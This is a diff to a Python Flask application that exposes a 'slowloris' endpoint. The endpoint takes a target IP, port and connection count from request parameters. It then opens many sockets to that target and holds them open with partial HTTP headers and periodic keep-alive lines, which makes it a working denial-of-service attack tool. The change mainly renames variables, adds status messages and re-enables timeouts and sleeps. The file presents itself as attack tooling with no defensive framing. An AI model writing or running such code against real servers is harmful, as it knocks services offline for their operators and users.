@@ -1,6 +1,9 @@
 import time
-from flask import Flask
 import sys
+import socket
+import random
+
+from flask import Flask
 from scapy.all import *
 from flask import request
 
@@ -79,43 +82,56 @@ def slowloris():
             "Accept-language: en-US,en,q=0.5",
             "Connection: Keep-Alive"
         ]
-        num_sockets = int(request.args.get('pktCount'))
+        howmany_sockets = int(request.args.get('pktCount'))
         ip = request.args.get('ip')
         port = int(request.args.get('port'))
-        all_sockets = []
-        for k in range(num_sockets):
+        allthesockets = []
+        print("Creating sockets...")
+        for k in range(howmany_sockets):
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(4)
                 s.connect((ip, port))
-                all_sockets.append(s)
+                allthesockets.append(s)
             except Exception as e:
                 print(e)
-        print(range(num_sockets)," sockets are ready.")
+        print(range(howmany_sockets)," sockets are ready.")
         num = 0
-        for r in all_sockets:
+        for r in allthesockets:
             print("[",num,"]")
             num += 1 
             r.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+            print("Successfully sent [+] GET /? HTTP /1.1 ...")
             for header in headers:
                 r.send(bytes("{}\r\n".format(header).encode("utf-8")))
-
+            print("Successfully sent [+] Headers ...")
+ 
         while True:
-            for v in all_sockets:
+            for v in allthesockets:
                 try:
                     v.send("X-a: {}\r\n".format(random.randint(1,5000)).encode("utf-8"))
+                    print("[-][-][*] Waiter sent.")
                 except:
-                    all_sockets.remove(v)
+                    print("[-] A socket failed, reattempting...")
+                    allthesockets.remove(v)
                     try:
                         v.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        # v.settimeout(4)
+                        v.settimeout(4)
                         v.connect((ip,port))
-                        #for each socket:
                         v.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode("utf-8"))
                         for header in headers:
                             v.send(bytes("{}\r\n".format(header).encode("utf-8")))
                     except:
                         pass
-            # time.sleep(1)
+ 
+            print("\n\n[*] Successfully sent [+] KEEP-ALIVE headers...\n")
+            print("Sleeping off ...")
+            time.sleep(10)
+            
+        
+        
     except ConnectionRefusedError:
+        print("[-] Connection refused, retrying...")
         slowloris()
+    
+ 
